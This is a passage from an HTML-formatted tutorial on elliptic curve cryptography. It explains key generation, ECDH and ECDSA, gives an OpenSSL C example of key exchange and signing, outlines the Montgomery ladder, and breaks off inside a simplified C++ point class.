&lt;p&gt;Elliptic curve cryptography (ECC) is an approach to public key cryptography based on the algebraic structure of elliptic curves over finite fields. ECC requires smaller keys compared to non-elliptic curve cryptography (based on plain Galois fields) to provide equivalent security.&lt;/p&gt;

&lt;p&gt;The Montgomery algorithm is an efficient method for performing the point multiplication operation that is at the heart of most elliptic curve cryptographic algorithms.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Initialization:&lt;/em&gt; - Two parties agree on a global elliptic curve and a base point on the curve. This base point is chosen such that when it is repeatedly added to itself, the resultant points “wrap around” the curve instead of marching off to infinity.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Key Generation:&lt;/em&gt; - Each party generates a private key, which is a random integer, and a public key, which is the base point added to itself private key number of times. Because the operation is computationally difficult (one-way), the private key cannot be feasibly calculated from the public key.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Encryption:&lt;/em&gt; - To encrypt a message, a party must first translate the message into a point on the curve. They then generate a random integer, and produce two points: the base point added to itself random integer number of times, and the message point added to the other party’s public key random integer number of times.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Decryption:&lt;/em&gt; - The receiving party multiplies the first point by their own private key, which results in a new point. They then subtract the new point from the second point to retrieve the original message point.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Elliptic curves over real numbers and the group law&lt;/strong&gt; - Elliptic curves over real numbers are curves defined by the equation &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y^2 = x^3 + ax + b&lt;/code&gt;. In this equation, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b&lt;/code&gt; are constants that determine the specific shape of the curve. The curves have a property we call the “group law” that allows us to “add” points on the curve together to get a third point on the curve. This addition usually doesn’t match our normal idea of addition, but it has some similar properties, like being commutative and associative.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Elliptic curves over finite fields and the discrete logarithm problem&lt;/strong&gt; - When we talk about elliptic curves in cryptography, we usually mean elliptic curves over finite fields. A finite field is a set with a finite number of elements and two operations that have properties of addition and multiplication. For example, the field of two elements &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{0, 1}&lt;/code&gt; with the usual operations of addition and multiplication modulo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt; is a finite field. The discrete logarithm problem on elliptic curves over finite fields forms the basis for the security of elliptic curve cryptography.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Key pair generation and two ECC algorithms: ECDH and ECDSA&lt;/strong&gt; - Key pair generation in ECC starts with choosing an elliptic curve and a point on that curve. Then a random number is generated, which serves as the private key. To get the corresponding public key, the private key is “multiplied” (using the group law we talked about) with the chosen point on the curve. The result is another point on the curve, which is the public key.&lt;/p&gt;

&lt;p&gt;ECDH (Elliptic Curve Diffie-Hellman) and ECDSA (Elliptic Curve Digital Signature Algorithm) are two common cryptographic algorithms that use ECC. ECDH is a key exchange protocol, and ECDSA is a digital signature protocol. They are similar to the original Diffie-Hellman and DSA protocols, but they use operations on elliptic curves instead of operations in the multiplicative group of integers modulo p.&lt;/p&gt;

&lt;p&gt;Implementing elliptic curve cryptography from scratch is a complex task and beyond the scope of this report due to the amount of code involved and the level of mathematical detail required. However, we can guide you on how to use existing libraries to perform operations related to elliptic curves.&lt;/p&gt;

&lt;p&gt;OpenSSL is a widely-used and comprehensive library that includes support for elliptic curve cryptography. Here is an example on how you can generate a pair of keys, perform ECDH key exchange, and create a signature using ECDSA.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;openssl/evp.h&amp;gt;
#include &amp;lt;openssl/ec.h&amp;gt;
#include &amp;lt;openssl/ecdh.h&amp;gt;
#include &amp;lt;openssl/ecdsa.h&amp;gt;
#include &amp;lt;openssl/rand.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_len2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Generate two keys for ECDH key exchange. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_new_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EVP_PKEY_EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_keygen_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_set_ec_paramgen_curve_nid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NID_X9_62_prime256v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_keygen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_keygen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Derive the shared secret. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive_set_peer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkey2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;secret1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Swap the keys and derive the shared secret again. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive_set_peer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkey1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;secret2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_derive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_CTX_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Now we have two shared secrets that should be equal. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_len1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_len2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Create a signature using ECDSA. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EC_KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eckey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EVP_PKEY_get1_EC_KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;RAND_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* Get a random &quot;message&quot;. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ECDSA_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eckey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ECDSA_sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eckey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Verify the signature. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ECDSA_verify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eckey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Clean up. */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EVP_PKEY_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkey2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EC_KEY_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eckey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The example above generates two keys for ECDH, derives the shared secret from both keys (which should be equal), creates a random message and a signature for it, and verifies the signature, and would be compiled with:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc crypto_hack.c &lt;span class=&quot;nt&quot;&gt;-lssl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lcrypto&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ./crypto
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;montgomery-ladder-for-ecc&quot;&gt;Montgomery Ladder for ECC&lt;/h3&gt;

&lt;p&gt;The Montgomery Ladder technique, named after its creator &lt;a href=&quot;https://en.wikipedia.org/wiki/Peter_Montgomery_(mathematician)&quot;&gt;Peter Montgomery&lt;/a&gt;, is an algorithm used to perform the scalar multiplication operation in ECC. The main advantage of the Montgomery ladder is its resistance to simple power analysis and timing attacks, due to its regular, identical sequence of operations for each bit in the key.&lt;/p&gt;

&lt;p&gt;Here’s a step-by-step process:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initialize two points &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R1&lt;/code&gt; on the curve such that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0 = 0&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R1 = P&lt;/code&gt;, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;P&lt;/code&gt; is the point being multiplied.&lt;/li&gt;
  &lt;li&gt;For each bit in the key, starting with the most significant and moving to the least significant: If the bit is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, perform the operation: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0 = R0 + R1, R1 = 2 * R1&lt;/code&gt;. If the bit is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, perform the operation: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R1 = R0 + R1, R0 = 2 * R0&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;At the end of this process, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0&lt;/code&gt; will contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kP&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can provide a basic example of an implementation of ECC point addition and doubling. This code doesn’t implement Montgomery multiplication, but will give you an idea of how ECC works. This is a simplified version and for actual cryptographic applications, a more robust and secure version is needed:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;EllipticCurve&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

